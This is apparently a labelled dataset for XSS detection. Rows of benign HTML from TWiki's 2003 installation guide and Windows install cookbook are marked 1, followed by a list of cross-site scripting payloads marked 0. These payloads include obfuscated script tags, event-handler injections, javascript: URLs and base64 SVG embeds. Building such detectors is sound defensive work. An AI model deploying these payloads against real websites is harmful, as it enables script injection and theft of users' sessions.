<tr><td></td><td align="center"> <code>Net::SMTP</code></td></tr>	1
<tr><td> RCS </td><td colspan="2" align="center"><br />	1
<tr><td> GNU <code>diff</code> </td><td colspan="2" align="center"> GNU <code>diff</code><br />	1
<tr><td></td><td colspan="2" align="center"> <code>ls, fgrep, egrep</code> </td></tr>	1
<tr><td></td><td align="center"> <code>cron</code> </td><td> <code>cron</code></td></tr>	1
<tr><td> Web server </td><td colspan="2" align="center"> Apache</td></tr>	1
<img src="http://TWiki.org" border="0" alt="ALERT!" width="16" height="16" />	1
<a name="ClientRequirements"></a>	1
<h2><a name="Client_Requirements"> Client Requirements </a></h2>	1
The TWiki <a href="http://TWiki.org">standard installation</a>	1
You can easily add functionality, by customizing <a href="http://TWiki.org">TWikiTemplates</a>	1
<h2><a name="Known_Issues"> Known Issues </a></h2>	1
-- <a href="http://TWiki.org/cgi-bin/">MikeMannix</a>	1
<h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1>	1
<em>Installation instructions for the TWiki 01-Feb-2003 production release. Update notes for the new RCS configuration are marked</em>	1
These installation steps are based on the <strong>Apache</strong> web server on <strong>Linux</strong>	1
<a name="StandardInstallation"></a>	1
<h2><a name="Standard_Installation"> Standard Installation </a></h2>	1
Request and download the TWiki<a href="http://TWiki.org/download.html" target="_top">http://TWiki.org/download.html</a>	1
<h3><a name="Step_1_Create_Configure_the_Dire"> Step 1: Create</a></h3>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<br /> <img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<blockquote style="background-color:#F5F5F5">	1
<strong>Example <code>httpd.conf</code> entries:</strong>	1
<pre> ScriptAlias /twiki/bin/ "/home/httpd/twiki/bin/"	1
&lt;/Directory&gt;</pre>	1
<em>Go directly to <a href="#StepTwo">Step 2</a>...</em>	1
<a name="StepOneB"></a>	1
<h4><a name="Step_1_for_Non_Root_Accounts"> Step 1 for Non-Root Accounts </a></h4>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>TWiki dir:</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> <code>twiki</code> </td><td> start-up pages </td><td> root TWiki dir </td><td> <code>/home/smith/twiki/</code> </td></tr>	1
<tr><td> <code>twiki/bin</code> </td><td> CGI bin </td><td> CGI-enabled dir </td><td> <code>/home/smith/twiki/bin</code> </td></tr>	1
<tr><td> <code>twiki/lib</code> </td><td> library files </td><td> same level as <code>twiki/bin</code> </td><td> <code>/home/smith/twiki/lib</code> </td></tr>	1
<tr><td> <code>twiki/pub</code> </td><td> public files </td><td> htdoc enabled dir </td><td> <code>/home/smith/twiki/pub</code> </td></tr>	1
<tr><td> <code>twiki/data</code> </td><td> topic data </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/data</code> </td></tr>	1
<tr><td> <code>twiki/templates</code> </td><td> web templates </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/templates</code> </td></tr>	1
If you are not able to create the <code>twiki/lib</code> directory at the same level as the <code>twiki/bin</code>	1
twikiLibPath = <font color="red">'/some/other/path/lib'</font>; # Path to lib directory containing TWiki.pm	1
You can also edit <code>localPerlLibPath</code> in the <code>setlib.cfg</code>	1
<a name="StepTwo"></a>	1
<h3><a name="Step_2_Set_File_Permissions"> Step 2: Set File Permissions </a></h3>	1
<strong>IMPORTANT:</strong> On ISP-hosted accounts, Perl CGI scripts usually require a <code>.cgi</code>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<h3><a name="Step_3_Set_the_Main_Configuratio"> Step 3: Set the Main Configuration File </a></h3>	1
<strong>Security issue:</strong> Directories <code>twiki/data</code> , <code>twiki/templates</code>	1
<h3><a name="Step_4_Configure_Site_Wide_Email"> Step 4: Configure Site-Wide Email Preferences </a></h3>	1
<code>WIKIWEBMASTER</code> should be set to the email address of the TWiki administrator	1
<code>SMTPMAILHOST</code> is typically set on Windows or other non-Unix/Linux systems, where <code>sendmail</code>	1
<code>SMTPSENDERHOST</code> is optional, and set to the domain name sending the email (e.g. <code>twiki.yourdomain.com</code>).	1
<h3><a name="Step_5_Finish_Up_from_Your_Brows"> Step 5: Finish Up from Your Browser </a></h3>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	1
<h2><a name="Additional_Server_Level_Options"> Additional Server-Level Options </a></h2>	1
<a name="AuthenticationOfUsers"></a>	1
<h3><a name="Enabling_Authentication_of_Users"> Enabling Authentication of Users </a></h3>	1
<strong>Rename</strong> file <code>.htaccess.txt</code> in the <code>twiki/bin</code> directory to <code>.htaccess</code>	1
<code>Redirect <font color="red">/urlpathto/twiki/index.html</font> http://<font color="red">yourdomain.com/urlpathto/twiki/bin/</font>view</code> <br>	1
<code>AuthUserFile <font color="red">/filepathto/twiki/data/</font>.htpasswd</code> <br />	1
<code>ErrorDocument 401 <font color="red">/urlpathto/twiki/bin/</font>oops/TWiki/TWiki</code>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<strong>This applies only if you have root access:</strong> on hosted accounts, you shouldn't have this problem - otherwise, email tech support.	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<strong>Copy</strong> the <a href="http://TWiki.org/cgi-bin/view/TWiki/TWikiRegistrationPub">TWikiRegistrationPub</a>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<h2><a name="TWiki_File_System_Info"> TWiki File System Info </a></h2>	1
See <a href="http://TWiki.org/cgi-bin/view/TWiki/AppendixFileSystem">Appendix A: TWiki File System</a>	1
-- <a href="http://TWiki.org/cgi-bin/view/TWiki/PeterThoeny">PeterThoeny</a> - 28 Dec 2002 <br />	1
-- <a href="http://TWiki.org/cgi-bin/view/Main/MikeMannix">MikeMannix</a> - 16 May 2002	1
<h1><a name="Windows_Install_Cookbook"> Windows Install Cookbook </a></h1>	1
<h2><a name="Introduction"> Introduction </a></h2>	1
This cookbook is intended to get you up and running with TWiki on Windows quickly, with as few problems as possible. The 'cookbook' approach is simply to restrict the many choices that someone installing	1
TWiki must make, so that a reasonably well-defined procedure can be followed - new users can simply follow the steps, while experts can use this as more of a guideline. Please read	1
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">TWiki:Codev.WindowsModPerlInstallCookbook</a> in case you use mod_perl.	1
-- <a href="http://TWiki.org/cgi-bin/view/Main/RichardDonkin">RichardDonkin</a> - 24 Feb 2002	1
<h2><a name="Recent_updates"> Recent updates </a></h2>	1
30 Nov 2002 - added <code>binutils</code> to list of Cygwin packages, and added warning not to use Apache 2.0	1
20 Nov 2002 - update to avoid <a href="http://twiki.org/cgi-bin/view/Support.InstallDigestSHA1Fails" title="'Support.InstallDigestSHA1Fails' on TWiki site, we know it!">SHA1Fails</a>	1
12 Nov 2002 - setting <code>SMTPMAILHOST</code> for user registration and notification	1
03 Sep 2002 - linked to <a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">Codev</a>	1
20 Jul 2002 - added flags to <code>grep</code> commands in <code>TWiki.cfg</code>	1
20 Jun 2002 - added creation of <code>c:/twiki</code> directory	1
15 Jun 2002 - various notes on Cygwin installation and troubleshooting: use of 'Unix' as default text file type (i.e. for mounting <code>c:/cygwin</code> directories) is essential for binary attachment uploads to work properly	1
<code>egrep</code> and <code>fgrep</code> on some Cygwin versions (fix from <a href="http://twiki.org/cgi-bin/view/Main.DavidLeBlanc" title="'Main.DavidLeBlanc' on TWiki site, we know it!">TWiki</a>)	1
21 Apr 2002 - updates on download sizes and free disk space requirements, improved post-installation <a href="#Testing_your_TWiki_installation">testing</a>	1
<a href="http://twiki.org/cgi-bin/" title="'Main.MaryDeMarco' on TWiki site, we know it!">TWiki:MaryDeMarco</a>	1
<code>pcre</code> to list of Cygwin packages (required by <code>grep</code>)	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiAlphaRelease" title="'Codev.TWikiAlphaRelease' on TWiki site, we know it!">TWiki:Codev.TWikiAlphaRelease</a>	1
3 Mar 2002 - minor update to include <code>uname -a</code> command to check Cygwin DLL version, and delete Apache config's PassEnv line	1
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsInstallCookbookComments" title="'Codev.WindowsInstallCookbookComments' on TWiki site, we know it!">TWiki:Codev.WindowsInstallCookbookComments</a>	1
<code>register</code>, fixed minor typo in Cygwin binary mode section, after beta testing by	1
<h2><a name="Scope"> Scope </a></h2>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>Component</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> Operating System </td><td> Windows 2000 </td><td> Should also work for Windows NT </td></tr>	1
<tr><td> Web Server </td><td><a href="http://httpd.apache.org" target="_top">http://httpd.apache.org</a>, but <strong>don't</strong> use Apache 2.0 yet) </td></tr>	1
<tr><td> Unix tools </td><td> Cygwin 1.3.9 </td><td> Simplest way to get a whole set of required tools </td></tr>	1
<tr><td> Perl </td><td> Cygwin perl-5.6.1-2 </td><td> Comes with Cygwin </td></tr>	1
<tr><td> RCS </td><td> Cygwin rcs-5.7-2 </td><td> Comes with Cygwin, includes a file corruption bugfix </td></tr>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/new.gif" border="0" alt="NEW" width="28" height="8" />	1
<h3><a name="Alternatives"> Alternatives </a></h3>	1
<a href="http://twiki.org/cgi-bin/" title="'Codev.ActiveState' on TWiki site, we know it!">TWiki:Codev.ActiveState</a>	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindows" title="'Codev.TWikiOnWindows' on TWiki site, we know it!">TWiki:Codev.TWikiOnWindows</a>	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindowsKnownConfigurations" title="'Codev.TWikiOnWindowsKnownConfigurations' on TWiki site, we know it!">Configurations</a>	1
<a href="http://twiki.org/cgi-bin/view/Support.TwikiOnWindowsBinaryAttachments" title="'Support.TwikiOnWindowsBinaryAttachments' on TWiki site, we know it!">TWiki:Support</a>.	1
<h2><a name="Checking_versions"> Checking versions </a></h2>	1
If you already have some of these add-ons installed, here's how to check the versions - this assumes you have	1
<i>: Cygwin DLL version is the number in 1.3.x format</i>	1
less c:/<i>your-apache-dir</i>/Announcement	1
If you have an older version of any component, do yourself a favour and <strong>upgrade it</strong> as part of the install process.	1
<h2><a name="Pre_requisites_and_upgrades"> Pre-requisites and upgrades </a></h2>	1
<h3><a name="Text_editing"> Text editing </a></h3>	1
<code>nano</code>, a non-GUI editor, but if you prefer to use a GUI editor, you should first install PFE, a freeware editor that supports Unix format files. PFE is available	1
Another good <a href="http://twiki.org/cgi-bin/view/Codev.OpenSource" title="'Codev.OpenSource' on TWiki site, we know it!">TWiki:Codev.OpenSource</a>	1
<h2><a name="The_Unix_Windows_Environment"> The Unix/Windows Environment </a></h2>	1
It's a little known fact that you can use pathnames such as <code><b>c:/apache</b></code> almost everywhere in Windows - try it in a File Open dialogue box.	1
The reason this matters is that <code><b>'\'</b></code> is a special character to Perl and other tools, so it's much easier to use <code><b>'/'</b></code> everywhere.	1
<h3><a name="The_Cygwin_environment"> The Cygwin environment </a></h3>	1
<a href="http://twiki.org/cgi-bin/view/Codev.CygWin" title="'Codev.CygWin' on TWiki site, we know it!">TWiki:Codev.CygWin</a> is a Unix-like environment for Windows	1
<h3><a name="The_Apache_environment"> The Apache environment </a></h3>	1
If you need to use spaces in file names (not recommended), put double quotes around the file name in the <code>httpd.conf</code>	1
<h3><a name="The_Perl_environment"> The Perl environment </a></h3>	1
<code>ls</code>, <code>egrep</code>, and RCS tools that it (typically) launches with the <code>bash</code> shell.	1
If you need to use spaces in file names (not recommended), you <em>may</em><code>TWiki.cfg</code>	1
<h2><a name="Installing_Components"> Installing Components </a></h2>	1
<h3><a name="TWiki_part_1_"> TWiki (part 1) </a></h3>	1
Head to <a href="http://twiki.org" target="_top">http://twiki.org</a>	1
<h3><a name="Apache"> Apache </a></h3>	1
<strong>1. Download Apache</strong>	1
<a href="http://httpd.apache.org/" target="_top">http://httpd.apache.org/</a>	1
<a href="http://www.apache.org/dist/httpd/Announcement.html" target="_top">this page</a>	1
<a href="http://www.apache.org/dyn/closer.cgi" target="_top">http://www.apache.org/dyn/closer.cgi</a>	1
The file to download is <code><b></b></code>	1
<strong><em>NOTE</em></strong><code><b>instmsi.exe</b></code><a href="http://httpd.apache.org/dist/httpd/binaries/win32/" target="_top"></a>	1
<strong><em>NOTE</em></strong>: The Apache package itself requires a download of around 2 MB, and up to 10 MB of free disk space once installed.	1
<strong>2. Install Apache</strong>	1
Specify <code><b>c:\</b></code> as the installation directory - this actually installs Apache into <code><b>c:\apache</b></code> (if you specify <code>c:\apache</code>	1
<a href="http://httpd.apache.org/docs/windows.html" target="_top">Installing Apache on Windows</a> and <a href="http://httpd.apache.org/docs/win_service.html" target="_top">Windows NT/2000 service</a>.	1
<strong>3. Test Apache</strong>	1
If necessary, start apache, either as a Win2000 service (using Admin Tools | Computer Management, or by typing <code>apache -k start -n apache</code>	1
Point your browser at <a href="http://yourdomain.com/" target="_top">http://yourdomain.com/</a> to see the Apache intro page.	1
<code>apache -k restart</code> for standalone Apache process running in another window	1
<code>apache -k restart -n apache</code> for Apache running as a Win2000 service (-n gives name of service)	1
Another useful command is <code>apache -k stop</code>.	1
<h3><a name="Cygwin_Unix_tools_Perl_and_RCS"> </a> Cygwin, Unix tools, Perl and RCS </h3>	1
<strong>4. Install Cygwin</strong>	1
Head to <a href="http://cygwin.com" target="_top">http://cygwin.com</a>, and click the <strong><em>Install Cygwin Now</em></strong> link.	1
Now run the Cygwin <code>setup.exe</code> file - this will also install Perl and RCS in one fell swoop.	1
On first page, accept the defaults (be sure that the <strong><em>default text file type is Unix</em></strong> to avoid problems with attachment uploads, and specify 'install for all users')	1
Select <code>c:\download\cygwin-dist</code> as the local package directory, and suitable proxy settings, then pick a local mirror site	1
In the package list screen, hit the <strong>View</strong> button until you get an alphabetical list that says <strong>Full</strong> to the right of the button.	1
Leave the radio button on <strong>Curr</strong> (Current)	1
For each package, make sure the <strong>New</strong> column in the installer has a version number under it. If it says 'Skip' or 'Keep'	1
<code>bash</code>	1
<code>wget</code> (optional, useful for Perl install and <a href="http://twiki.org/cgi-bin/view/Codev.ReadWriteOfflineWiki" title="'Codev.ReadWriteOfflineWiki' on TWiki site, we know it!">TWiki:Codev.ReadWriteOfflineWiki</a>)	1
<a href="http://cygwin.com/faq/faq.html#SEC32" target="_top">Cygwin FAQ entry</a> and upgrade <code>libncurses5</code>.	1
<strong><em>NOTE</em></strong>: The mandatory packages require a download of about 12 MB - about half of this is Perl, which would be necessary even without Cygwin, and most of the rest is gcc	1
<strong><em>NOTE</em></strong>: The installer keeps a local copy of downloaded files, so it's easy to re-install without re-downloading.	1
<strong>5. Test Cygwin</strong>	1
Launch the desktop icon - this runs the <code>bash</code> shell, which has command line editing features	1
TIP: When typing a directory or file name, hit the TAB key after the first few letters of the name - <code>bash</code> will 'complete' the name.	1
Type <code>rcs -V</code> - you should see the RCS version, 5.7	1
Type <code>perl -v</code> - you should see cygwin mentioned in the first line, and the Perl version, 5.6.1	1
Type <code>grep home /etc/passwd</code> - you should see some output.	1
The <a href="http://cygwin.com/cygwin-ug-net/cygwin-ug-net.html" target="_top">Cygwin User Guide</a> is well worth reading for some background on how Cygwin works.	1
<strong>6. Configure Cygwin for binary mode</strong>	1
<strong><em>This is very important - omitting this step leads to a partially working system that corrupts RCS files</em></strong>	1
<a href="http://twiki.org/cgi-bin/view/Codev.CookbookLineEndingProblems" title="'Codev.CookbookLineEndingProblems' on TWiki site, we know it!">TWiki:Codev.CookbookLineEndingProblems</a>	1
<b>mkdir /twiki /c c:/twiki</b>	1
This configures <code>/twiki</code> (known as a 'mount point') to map onto <code>c:/twiki</code> and for that directory tree to always be in binary mode, and does the same for <code>/c</code>	1
It is <strong>very important</strong> that all lines in the output of <code>mount</code> say 'binmode' under Flags	1
If the lines for <code>C:\cygwin</code> directories do not, you should uninstall and then re-install Cygwin to ensure that binary attachment uploads will work.	1
<a href="http://www.cygwin.com/cygwin-ug-net/using.html" target="_top">Cygwin documentation</a> for more details on this.	1
Type <code><b>cd /twiki</b></code>	1
Type <code><b>echo hi &gt;t</b></code>	1
Type <code><b>cat -v t</b></code> - you should see <code><b>hi</b></code> as the output	1
If you see filename errors, your <strong>mounts did not work</strong> for some reason - check your typing	1
If you see <code><b>hi^M</b></code> as output, <strong>your /twiki directory is not in binary mode</strong>	1
Clean up by doing <code>rm t</code>	1
This setup is written to the Windows registry, so there's no need to put these commands into a <code>.profile</code> file. For more information on binary vs text mode, see this	1
<a href="http://cygwin.com/cygwin-ug-net/using-textbinary.html" target="_top">User Guide section</a> and this <a href="http://cygwin.com/faq/faq.html#SEC54" target="_top">FAQ entry</a>.	1
<h3><a name="TWiki_part_2_"> TWiki (part 2) </a></h3>	1
/></track><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	0
 onmouseover='alert("xss".toUpperCase())	0
!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert(1))" "	0
!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert(1))&#39; &#39;	0
" onmouseover="alert('\u0058\u0053\u0053')	0
" onmouseover="alert('&#0088;&#0083;&#0083;')	0
" onmouseover="alert(/&#0088;&#0083;&#0083;/.source)	0
"'><script>eval("alert(document\x2ecookie)")</script>	0
"/onmousemove="window['\u0061lert']('\u0058SS')	0
"/onmouseover="window['aler'+'t']('XS'+'S')">	0
"&#39;><img src="javascript:alert(1)>	0
"&#39;><script>alert(1)</script> onclick=alert(1)	0
"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert();	0
"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert();	0
"><script>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</script>	0
"><script>eval("al"+"ert(1)");</script>	0
"><svg><script>alert&#40/1/.source&#41</script>	0
"onbeforepaste="&#000119indow['&#00097lert']('&#00088SS')" 	0
"onblur="&#x0077indow['&#x0061lert']('&#x0058SS')" 	0
"oncopy="&#0119indow['&#097lert']('&#088SS')" 	0
"ondblclick="&#00119indow['&#0097lert']('&#0088SS')"	0
"onKeyDown="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')"	0
"onKeyPress="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')()	0
"onKeyPress="u0077indow['u0061lert']('u0058SS')" 	0
"onmouseover="&#x077indow['&#x061lert']('&#x058SS')" 	0
"onmouseover="alert(decodeURI(decodeURI(/%58%53%53/.source)))"	0
"onpaste="&#119indow['&#97lert']('&#88SS')" 	0
"onSelectStart="/123441/['cons'+'truc'+'tor']['cons'+'truc'+'tor']('a'+'l'+'e'+'r'+'t'+'('+'''+'XS'+'S'+'''+')')()	0
"onSelectStart="&#x00077indow['&#x00061lert']('&#x00058SS')"	0
"st%00yle="behavior:\0075rl(bc)"onread%00ystatechange="ale%00rt(1)	0
\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert``;java	0
&#39; style=&#39;background:url(javascript:alert(1))&#39; &#39;	0
&#39;<s>&#39;><img src="javascript:alert(1)&#39;>	0
&#39;<s>&#39;><script>alert(1)</script>	0
&#39;><s><img src="javascript:alert(1)>	0
&#x09;</track><video><source onerror=javascript:window.onerror=alert();\u0061lert``;	0
&#x09;rel=<video><source <thead onerror=\u0061lert();	0
#saivs.js <video><source onerror=javascript:window.onerror=alert();javascript:alert();	0
%83%A1%82%83%A1%9E%83%A1%9Cscript%20%83%A1%9E%20alert(1)//%20%83%A1%9C/script%20%83%A1%9E	0
%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E	0
` onmouseover=`alert(/xss/.source.toUpperCase())	0
</command>enctype=rows=<video><source onerror=alert();	0
</form>al\u0065rt``;<video><source onerror=javascript:window.onerror=alert();alert();	0
</frameset></track><video><source src=x onerror=javascript:window.onerror=alert();	0
</iframe> /></textarea><video><source onerror=alert();	0
<%u00df style="color:ex/***/pression(alert(1));"/>	0
<a href="test:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">click me</a>	0
<a href=data:html;base64,PHNjcmlwdD5hbGVydCgwKTs8L3NjcmlwdD4=>a</a>	0
<body onload=alert(1); />	0
<body onmouseover=alert(1); <canvas </basefont>	0
<div style="color:\0065xpression(alert('XSS2'));">b</div>	0
<div style="color:&#x65;xpression(alert(1));">a</div>	0
<div style="left:&#x0065;xpression(alert(1))">	0
<embed onload=alert();<script type="text/javascript">	0
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>	0
